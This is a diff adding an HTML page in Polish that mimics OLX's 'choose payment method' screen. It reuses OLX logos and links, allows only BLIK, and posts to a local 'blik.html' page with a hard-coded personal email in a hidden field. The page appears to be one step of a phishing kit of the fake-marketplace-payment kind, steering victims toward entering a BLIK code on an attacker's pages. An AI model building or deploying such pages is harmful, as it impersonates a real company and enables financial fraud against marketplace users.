@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wybór metody płatności</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('olx.png'); /* Ścieżka do pliku z obrazkiem tła */
+            background-size: cover;          /* Dopasowanie tła do rozmiarów okna przeglądarki */
+            background-position: center;    /* Wyśrodkowanie tła */
+            background-repeat: no-repeat;   /* Zapobieganie powtarzaniu tła */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between; /* Rozkłada elementy na boki */
+            align-items: center; /* Wyrównanie logo i linków w jednej linii */
+            padding: 10px 20px; /* Większe odstępy od krawędzi */
+            background-color: rgba(0, 47, 52, 0.8); /* Przezroczysty pasek nawigacyjny */
+            width: 100%;
+            box-sizing: border-box;
+            position: relative; /* Umożliwia poprawne ustawienie logo w lewym górnym rogu */
+        }
+
+        .header a {
+            color: #FFFFFF;
+            font-size: 16px;
+            font-weight: 600;
+            margin-left: 20px;
+            text-decoration: none;
+        }
+
+        .header a:hover {
+            color: #7F9799;
+        }
+
+        .header img {
+            height: 30px; /* Wysokość logo */
+            margin-right: 20px; /* Odstęp między logo a linkami */
+            cursor: pointer; /* Wskazanie, że logo jest klikalne */
+        }
+
+        .content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 100%;
+            color: gray;
+            margin: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            color: #002F34;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .payment-option {
+            background-color: #f0f0f0;
+            padding: 15px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 500px;
+            margin-bottom: 15px;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .payment-option img {
+            height: 60px; /* Wysokość ikon płatności */
+            margin-bottom: 10px;
+        }
+
+        .payment-option:hover {
+            background-color: #e0e0e0;
+        }
+
+        .payment-option.selected {
+            background-color: #d0f0d0; /* Kolor tła dla zaznaczonej opcji */
+            border: 2px solid #00c853; /* Zielona ramka dla zaznaczonej opcji */
+        }
+
+        .payment-option.disabled {
+            background-color: #d0d0d0; /* Kolor tła dla zablokowanej opcji */
+            cursor: not-allowed; /* Kursor wskazujący, że opcja jest niedostępna */
+        }
+
+        .payment-option.disabled img {
+            opacity: 0.5; /* Zmniejszenie widoczności ikonki dla zablokowanej opcji */
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 500px; /* Opcjonalnie: maksymalna szerokość dla kontenera przycisków */
+        }
+
+        .cancel-button, .pay-button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .cancel-button {
+            background-color: transparent;
+            color: #002F34;
+            font-weight: bold;
+        }
+
+        .cancel-button:hover {
+            text-decoration: underline;
+        }
+
+        .pay-button {
+            background-color: #002F34;
+            color: white;
+        }
+
+        .pay-button:hover {
+            background-color: #005f60;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="https://www.olx.pl">
+            <img src="logo-olx.png" alt="Logo OLX" onclick="window.location.href='https://www.olx.pl';"> <!-- Dodanie logo OLX jako link -->
+        </a>
+        <div class="header-links">
+            <a href="https://www.olx.pl">Wiadomości</a>
+            <a href="https://www.olx.pl">Twoje konto</a>
+            <a href="https://www.olx.pl">Dodaj ogłoszenie</a>
+        </div>
+    </div>
+    <div class="content">
+        <h1>Wybierz metodę płatności</h1>
+        <form id="paymentForm" action="blik.html" method="post">
+            <!-- Ukryte pola z danymi użytkownika -->
+            <input type="hidden" name="name" value="">
+            <input type="hidden" name="email" value="pawel779277@wp.pl">
+
+            <div class="payment-option" id="blikOption">
+                <input type="hidden" name="paymentMethod" value="blik">
+                <img src="blik-logo.png" alt="Blik Logo"> <!-- Dodaj odpowiednią ikonę Blik -->
+                <p>Blik</p>
+            </div>
+            <div class="payment-option disabled">
+                <input type="hidden" name="paymentMethod" value="bankTransfer">
+                <img src="bank-transfer-logo.png" alt="Przelew Bankowy Logo"> <!-- Dodaj odpowiednią ikonę Przelew Bankowy -->
+                <p>Przelew bankowy</p>
+                <p><em>Opcja niedostępna</em></p>
+            </div>
+            <div class="buttons">
+                <button type="button" class="cancel-button" onclick="window.location.href='https://www.olx.pl';">Anuluj</button>
+                <button type="submit" class="pay-button" id="payButton" disabled>Zapłać</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        document.getElementById('blikOption').addEventListener('click', function() {
+            // Zaznacz opcję Blik
+            document.querySelectorAll('.payment-option').forEach(option => option.classList.remove('selected'));
+            this.classList.add('selected');
+
+            // Włącz przycisk Zapłać
+            document.getElementById('payButton').disabled = false;
+        });
+
+        // Sprawdź, czy metoda płatności jest wybrana przed wysłaniem formularza
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            const selectedOption = document.querySelector('.payment-option.selected');
+            if (!selectedOption) {
+                event.preventDefault(); // Zatrzymaj wysyłanie formularza
+                alert('Wybierz metodę płatności.');
+            }
+        });
+    </script>
+</body>
+</html>
